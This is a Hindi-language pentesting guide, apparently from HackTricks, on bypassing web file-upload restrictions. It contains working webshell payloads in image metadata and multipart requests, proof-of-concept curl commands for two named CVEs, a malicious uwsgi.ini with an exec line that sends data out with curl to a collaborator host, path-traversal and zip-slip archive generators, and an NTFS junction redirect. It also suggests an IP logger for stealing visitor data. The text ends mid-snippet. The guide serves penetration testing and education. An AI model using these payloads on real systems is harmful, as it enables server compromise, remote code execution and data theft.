# फ़ाइल अपलोड

{{#include ../../banners/hacktricks-training.md}}

## फ़ाइल अपलोड सामान्य कार्यप्रणाली

अन्य उपयोगी एक्सटेंशन:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### फ़ाइल एक्सटेंशन चेक बायपास करना

1. यदि लागू हो, तो ऊपर दिए गए **एक्सटेंशन्स** को **जांचें।** साथ ही कुछ **uppercase letters** के साथ भी टेस्ट करें: _pHp, .pHP5, .PhAr ..._
2. _वैध एक्सटेंशन से पहले कोई अन्य वैध एक्सटेंशन जोड़कर भी चेक करें (उपर्युक्त एक्सटेंशन्स का भी उपयोग करें):_
- _file.png.php_
- _file.png.Php5_
3. फाइल के अंत में **विशेष कैरेक्टर्स** जोड़कर देखिए। आप Burp का उपयोग कर के सभी **ascii** और **Unicode** कैरेक्टर्स को **bruteforce** कर सकते हैं। (_ध्यान दें कि आप ऊपर बताए गए **एक्सटेंशन्स** भी उपयोग कर सकते हैं_)  
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. सर्वर-साइड के एक्सटेंशन पार्सर को धोखा देकर प्रोटेक्शन्स बायपास करने की कोशिश करें, जैसे **extension को डबल करना** या एक्सटेंशन्स के बीच **junk data** (बोल्ड में **null** bytes) डालना। _बेहतर पेलोड तैयार करने के लिए आप ऊपर बताए गए एक्सटेंशन्स का भी उपयोग कर सकते हैं।_
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. पिछले चेक में **और लेयर ऑफ़ एक्सटेंशन्स** जोड़कर देखें:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. कोशिश करें कि **exec extension को वैध एक्सटेंशन से पहले** रखें और आशा करें कि सर्वर misconfigured हो (यह उन Apache misconfigurations को एक्सप्लॉयट करने में उपयोगी है जहाँ कुछ भी जिस पर extension .php है, जरूरी नहीं कि अंत में .php हो, वह execute हो सकता है):
- _ex: file.php.png_
7. **Windows** में **NTFS alternate data stream (ADS)** का उपयोग करें। इस स्थिति में, एक colon character ":" को एक forbidden extension के बाद और permitted one से पहले डाला जाएगा। परिणामस्वरूप सर्वर पर एक **empty file with the forbidden extension** बना दिया जाएगा (उदा. "file.asax:.jpg"). इस फ़ाइल को बाद में अन्य तकनीकों से edit किया जा सकता है जैसे कि इसकी short filename का उपयोग करके। "**::$data**” pattern का भी उपयोग non-empty files बनाने के लिए किया जा सकता है। इसलिए, इस pattern के बाद एक dot character जोड़ना और भी उपयोगी हो सकता है (.e.g. "file.asp::$data.")
8. फ़ाइल नाम की लिमिट्स तोड़ने की कोशिश करें। वैध एक्सटेंशन कट जाता है और malicious PHP बच जाता है। AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

कुछ upload handlers saved filename से trailing dot characters को trim या normalize कर देते हैं। UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) के 2.9.1 से पहले के वर्शन में, आप extension validation को नीचे दिए तरीके से bypass कर सकते हैं:

- एक वैध image MIME और magic header का उपयोग करें (उदा., PNG की `\x89PNG\r\n\x1a\n`)।
- अपलोड की गई फ़ाइल का नाम PHP extension के बाद एक dot के साथ रखें, उदाहरण: `shell.php.`।
- सर्वर trailing dot को हटा देता है और `shell.php` को persist कर देता है, जो कि यदि इसे web-served directory (default public storage जैसे `/storage/files/`) में रखा गया हो तो execute हो जाएगा।

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
फिर सेव किए गए path को हिट करें (Laravel + LFM में सामान्य):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Enforce strict server-side allowlists and re-validate the persisted filename.
- Serve uploads from non-executable locations.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- मैजिक नंबर चेक को बायपास करने के लिए फ़ाइल की शुरुआत में असली इमेज के **bytes** जोड़ें (जिससे _file_ command भ्रमित हो जाए)। या shell को **metadata** के अंदर डालें:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` या आप payload को सीधे एक इमेज में भी **introduce** कर सकते हैं:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- अगर आपकी इमेज पर **compression** जोड़ी जा रही है, उदाहरण के लिए कुछ standard PHP libraries जैसे [PHP-GD](https://www.php.net/manual/fr/book.image.php) का उपयोग करके, तो ऊपर की तकनीकें उपयोगी नहीं होंगी। हालांकि, आप **PLTE chunk** का उपयोग कर सकते हैं [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) ताकि कुछ टेक्स्ट insert किया जा सके जो **compression में भी जिंदा रहे**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- वेब पेज इमेज को **resizing** भी कर सकता है, उदाहरण के लिए PHP-GD functions `imagecopyresized` या `imagecopyresampled` का उपयोग करके। हालांकि, आप **IDAT chunk** का उपयोग कर सकते हैं [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) ताकि कुछ टेक्स्ट insert किया जा सके जो **compression में भी जिंदा रहे**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- एक और तकनीक जो payload को **image resizing** में जीवित रखती है, PHP-GD function `thumbnailImage` का उपयोग करती है। हालांकि, आप **tEXt chunk** का उपयोग कर सकते हैं [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) ताकि टेक्स्ट insert किया जा सके जो **compression में भी जिंदा रहे**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- पहले से uploaded फाइल का **rename** करने की vulnerability खोजें (extension बदलने के लिए)।
- backdoor को execute करने के लिए **Local File Inclusion** vulnerability खोजें।
- **Possible Information disclosure**:
1. एक ही फ़ाइल को **कई बार** (और **एक ही समय में**) वही नाम देकर upload करें।
2. उस नाम वाला फ़ाइल upload करें जो किसी पहले से मौजूद **file** या **folder** का **name** हो।
3. `"."`, `".."`, या `"…"` जैसे नाम से फ़ाइल upload करना। उदाहरण के लिए, Apache पर **Windows** में, यदि application अपलोड फाइलों को "/www/uploads/" डायरेक्टरी में सेव करता है, तो "." filename "/www/" डायरेक्टरी में "uploads” नाम की फाइल बना देगा।
4. ऐसी फ़ाइल upload करें जिसे आसानी से delete न किया जा सके, जैसे **"…:.jpg"** in **NTFS**. (Windows)
5. **Windows** में ऐसे नामों के साथ फ़ाइल upload करें जिनमें **invalid characters** हों, जैसे `|<>*?”`। (Windows)
6. **Windows** में reserved (forbidden) नामों का उपयोग करके फ़ाइल upload करें जैसे CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, और LPT9।
- यह भी कोशिश करें कि **executable** (.exe) या **.html** (कम संदिग्ध) upload करें जो गलती से पीड़ित द्वारा खोले जाने पर **code execute** कर दे।

### Special extension tricks

यदि आप **PHP server** पर files upload करने की कोशिश कर रहे हैं, तो [कोड execute करने के लिए **.htaccess** trick देखें](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
यदि आप **ASP server** पर files upload करने की कोशिश कर रहे हैं, तो [कोड execute करने के लिए **.config** trick देखें](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` फ़ाइलें `.jar` की तरह हैं (java के लिए), पर php के लिए, और इन्हें **php file की तरह उपयोग** किया जा सकता है (इन्हें php से execute करना, या किसी script में include करना...)।

`.inc` extension कभी-कभी php फ़ाइलों के लिए उपयोग होता है जो केवल **import files** करने के लिए होती हैं, इसलिए किसी समय किसी ने इस extension को execute होने की अनुमति दे दी हो सकती है।

## **Jetty RCE**

यदि आप Jetty server पर XML फ़ाइल upload कर सकते हैं तो आप [RCE प्राप्त कर सकते हैं क्योंकि **नए *.xml और *.war को автоматически processed किया जाता है**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** जैसा कि निम्न चित्र में बताया गया है, XML फ़ाइल को `$JETTY_BASE/webapps/` में upload करें और shell की उम्मीद करें!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

इस vulnerability के विस्तृत शोध के लिए मूल रिसर्च देखें: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

यदि किसी के पास `.ini` configuration file modify करने की क्षमता है तो uWSGI servers में Remote Command Execution (RCE) vulnerabilities का दुरुपयोग किया जा सकता है। uWSGI configuration files एक विशेष syntax का उपयोग करती हैं जिसमें "magic" variables, placeholders, और operators शामिल होते हैं। विशेष रूप से, '@' operator, जिसे `@(filename)` के रूप में उपयोग किया जाता है, किसी फ़ाइल की contents को include करने के लिए डिज़ाइन किया गया है। uWSGI में supported schemes में से "exec" scheme बहुत शक्तिशाली है, जो एक process के standard output से data पढ़ने की अनुमति देता है। जब किसी `.ini` configuration file को process किया जाता है, तो इस सुविधा का दुरुपयोग Remote Command Execution या Arbitrary File Write/Read के लिए किया जा सकता है।

निम्न हानिकारक `uwsgi.ini` फ़ाइल के उदाहरण पर विचार करें, जो विभिन्न schemes को दिखाती है:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
_payload_ का निष्पादन configuration फ़ाइल के parsing के दौरान होता है। configuration को सक्रिय और parsed होने के लिए, uWSGI process को या तो restart किया जाना चाहिए (संभाव्य रूप से crash के बाद या किसी Denial of Service attack के कारण) या फ़ाइल को auto-reload पर सेट किया जाना चाहिए। auto-reload फ़ीचर, अगर enabled हो, changes detect होने पर निर्दिष्ट intervals पर फ़ाइल को reload कर देता है।

uWSGI के configuration file parsing की lax प्रकृति को समझना महत्वपूर्ण है। विशेष रूप से, ऊपर चर्चा किया गया _payload_ किसी binary file (जैसे image या PDF) में insert किया जा सकता है, जिससे possible exploitation का दायरा और बढ़ जाता है।

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Gibbon LMS में एक unauthenticated endpoint वेब रूट के अंदर arbitrary file write की अनुमति देता है, जिससे एक PHP file drop करके pre-auth RCE संभव होता है। Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server type/name को ignore करता है, tail को base64-decode करता है)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
एक मिनिमल webshell डालें और कमांड्स चलाएँ:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notes:
- हैंडलर `base64_decode($_POST["img"])` को `;` और `,` से split करने के बाद चलाता है, फिर बाइट्स को `$absolutePath . '/' . $_POST['path']` पर बिना extension/type की वैलिडेशन किए लिख देता है।
- परिणामी कोड web service user के रूप में चलता है (उदा., XAMPP Apache on Windows)।

References for this bug include the usd HeroLab advisory and the NVD entry. See the References section below.

## **wget File Upload/SSRF Trick**

कुछ मामलों में आप पाएँगे कि एक सर्वर **`wget`** का उपयोग **download files** करने के लिए कर रहा है और आप **indicate** कर सकते हैं **URL**। इन मामलों में, कोड यह जाँच सकता है कि डाउनलोड की गई फ़ाइलों का extension एक whitelist के अंदर है ताकि केवल अनुमत फ़ाइलें ही डाउनलोड हों। हालांकि, **यह check को bypass किया जा सकता है।**\
The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. आप **download a file called "A"*232+".php"+".gif"** डाउनलोड कर सकते हैं, यह filename **bypass** the **check** करेगा (जैसे इस उदाहरण में **".gif"** एक **valid** extension है) लेकिन `wget` फ़ाइल को **rename** करके **"A"*232+".php"** कर देगा।
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **एक और विकल्प** जो आप इस चेक को bypass करने के लिए सोच रहे होंगे, वह यह है कि **HTTP server को किसी अलग file की ओर redirect कर दिया जाए**, ताकि प्रारम्भिक URL चेक को बायपास कर दे और फिर wget redirected file को नए नाम के साथ डाउनलोड कर दे। यह **काम नहीं करेगा** **जब तक** wget को **parameter** `--trust-server-names` के साथ उपयोग न किया गया हो क्योंकि **wget redirected page को उस नाम से डाउनलोड करेगा जो original URL में दिया गया था।**

### NTFS junctions (Windows) के जरिए upload directory से बाहर निकलना

(For this attack आपको Windows machine तक local access चाहिए होगी) जब uploads Windows पर per-user subfolders में संग्रहीत होते हैं (उदा., C:\Windows\Tasks\Uploads\<id>\) और आप उस उप-फ़ोल्डर के creation/deletion को नियंत्रित करते हैं, तो आप इसे एक directory junction से बदल सकते हैं जो किसी संवेदनशील स्थान की ओर इशारा करता है (उदा., webroot)। बाद की uploads target path में लिखी जाएंगी, जिससे code execution संभव हो सकता है अगर target server‑side code को interpret करता है।

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notes
- mklink /J एक NTFS directory junction (reparse point) बनाता है। वेब सर्वर के खाते को junction का पालन करना चाहिए और गंतव्य में write permission होना चाहिए।
- यह arbitrary file writes को redirect करता है; अगर गंतव्य scripts (PHP/ASP) execute करते हैं, तो यह RCE बन सकता है।
- रक्षात्मक उपाय: writable upload roots को attacker‑controllable होने की अनुमति न दें, खासकर C:\Windows\Tasks जैसे स्थानों के तहत; junction creation को block करें; extensions को server‑side validate करें; uploads को अलग volume पर स्टोर करें या deny‑execute ACLs के साथ रखें।

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

कुछ upload/ingest handlers raw request body को उस filesystem path पर लिखते हैं जिसे user-controlled query parameters से बनाया गया होता है। अगर handler Content-Encoding: gzip को सपोर्ट करता है और destination path को canonicalize/validate करने में विफल रहता है, तो आप directory traversal को एक gzipped payload के साथ जोड़कर arbitrary bytes को एक web-served directory में लिख सकते हैं और RCE प्राप्त कर सकते हैं (उदा., Tomcat के webapps में एक JSP drop करना)।

Generic exploitation flow:
- अपने server-side payload (उदा., minimal JSP webshell) तैयार करें और bytes को gzip-compress करें।
- एक POST भेजें जहाँ path parameter (उदा., token) में traversal होता है जो intended folder से बाहर निकलता है, और file उस filename को इंगित करता है जिसे persist करना है। Content-Type: application/octet-stream और Content-Encoding: gzip सेट करें; body compressed payload होना चाहिए।
- execution ट्रिगर करने के लिए लिखी गई फाइल को ब्राउज़ करें।

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
फिर ट्रिगर करें:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
नोट्स
- लक्ष्य पाथ इंस्टॉल के अनुसार भिन्न होते हैं (उदा., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). कोई भी वेब-एक्सपोज़्ड फ़ोल्डर जो JSP चलाता है काम करेगा।
- Burp Suite’s Hackvertor extension आपके payload से सही gzip बॉडी बना सकता है।
- यह एक शुद्ध pre-auth arbitrary file write → RCE पैटर्न है; यह multipart parsing पर निर्भर नहीं करता।

रोकथाम
- Upload destinations को सर्वर-साइड पर निर्धारित करें; क्लाइंट से मिलने वाले path fragments पर कभी भरोसा न करें।
- Canonicalize करें और यह लागू करें कि resolved path किसी allow-listed base directory के भीतर ही रहे।
- Uploads को non-executable volume पर स्टोर करें और writable paths से script execution को नकारें।

## टूल्स

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) एक शक्तिशाली टूल है जो Pentesters और Bug Hunters को file upload mechanisms का परीक्षण करने में मदद करने के लिए बनाया गया है। यह विभिन्न bug bounty techniques का उपयोग करके vulnerabilities की पहचान और exploit करने की प्रक्रिया को सरल बनाता है, और web applications का thorough assessment सुनिश्चित करता है।

### snprintf quirks के साथ upload indices को भ्रष्ट करना (historical)

कुछ पुराने upload handlers जो `snprintf()` या समान का उपयोग करके single-file upload से multi-file arrays बनाते हैं, उन्हें `_FILES` स्ट्रक्चर बनावट में धोखा दिया जा सकता है। `snprintf()` व्यवहार में असंगतियों और truncation के कारण, सावधानीपूर्वक तैयार एक single upload सर्वर-साइड पर कई indexed files के रूप में दिखाई दे सकती है, जिससे ऐसी लॉजिक भ्रमित हो सकती है जो एक सख्त shape मानती है (उदा., इसे multi-file upload मानकर unsafe branches लेना)। आज के समय में यह पैटर्न दुर्लभ है, पर CTFs और पुराने कोडबेस में कभी-कभी फिर से उभर आता है।

## File upload से अन्य vulnerabilities तक

- **filename** को `../../../tmp/lol.png` सेट करें और **path traversal** प्राप्त करने का प्रयास करें
- **filename** को `sleep(10)-- -.jpg` सेट करें और संभवतः **SQL injection** प्राप्त कर पाएँ
- **filename** को `<svg onload=alert(document.domain)>` सेट करें ताकि **XSS** हो
- **filename** को `; sleep 10;` सेट करके कुछ command injection परीक्षण करें (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- अलग-अलग svg payloads आज़माएँ: [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- यदि आप web server को किसी URL से image पकड़ने के लिए निर्देश दे सकते हैं तो आप [SSRF](../ssrf-server-side-request-forgery/index.html) का दुरुपयोग कर सकते हैं। अगर यह **image** किसी public साइट में सेव होने वाली है, तो आप [https://iplogger.org/invisible/](https://iplogger.org/invisible/) का URL भी दे सकते हैं और हर विज़िटर की जानकारी चुरा सकते हैं।
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- XSS के लिए विशेष रूप से तैयार PDFs: निम्न पृष्ठ बताती है कि कैसे **PDF data inject करके JS execution प्राप्त** की जा सकती है (../xss-cross-site-scripting/pdf-injection.md). यदि आप PDFs अपलोड कर सकते हैं तो आप दिए गए निर्देशों के अनुसार arbitrary JS execute करने वाला PDF तैयार कर सकते हैं।
- सर्वर में किसी भी **antivirus** की जाँच करने के लिए \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) कंटेंट अपलोड करें
- फाइलें अपलोड करते समय कोई **size limit** है या नहीं जाँचें

यहाँ अपलोड करके आप क्या हासिल कर सकते हैं — एक टॉप 10 सूची (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## मैजिक हेडर बाइट्स

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

अन्य filetypes के लिए देखें [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)।

## Zip/Tar फ़ाइल का स्वतः डीकम्प्रेस होने वाला Upload

यदि आप ऐसा ZIP अपलोड कर सकते हैं जिसे सर्वर के अंदर डीकम्प्रेस किया जाएगा, तो आप 2 चीज़ें कर सकते हैं:

### Symlink

अन्य फाइलों के soft links वाले एक link को अपलोड करें, फिर जब आप डीकम्प्रेस की गई फाइलों को एक्सेस करेंगे तो आप उन linked files को एक्सेस कर पाएंगे:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### अलग-अलग फ़ोल्डरों में Decompress

decompression के दौरान डायरेक्टरीज़ में फाइलों का अनपेक्षित निर्माण एक गंभीर समस्या है। प्रारम्भिक धारणाओं के बावजूद कि यह सेटअप malicious file uploads के ज़रिये OS-level command execution से रक्षा कर सकता है, ZIP archive format की hierarchical compression support और directory traversal क्षमताओं का दुरुपयोग किया जा सकता है। इससे attackers प्रतिबंधों को बायपास कर सकते हैं और लक्षित एप्लिकेशन की decompression functionality को manipulate करके secure upload directories से बाहर निकल सकते हैं।

ऐसी फाइलें बनाने के लिए एक automated exploit [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) पर उपलब्ध है। यह utility इस प्रकार उपयोग की जा सकती है:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
इसके अलावा, **symlink trick with evilarc** एक विकल्प है। यदि उद्देश्य `/flag.txt` जैसी फ़ाइल को लक्षित करना है, तो उस फ़ाइल का symlink आपके सिस्टम में बनाया जाना चाहिए। इससे evilarc को उसके संचालन के दौरान त्रुटियाँ नहीं आएँगी।

नीचे Python कोड का एक उदाहरण है जो एक दुष्ट zip फ़ाइल बनाने के लिए उपयोग किया जाता है:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

अधिक जानकारी के लिए **मूल पोस्ट देखें**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP कोड लिखा गया है जो `$_REQUEST` वेरिएबल के माध्यम से भेजे गए कमांड्स को चलाता है।

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
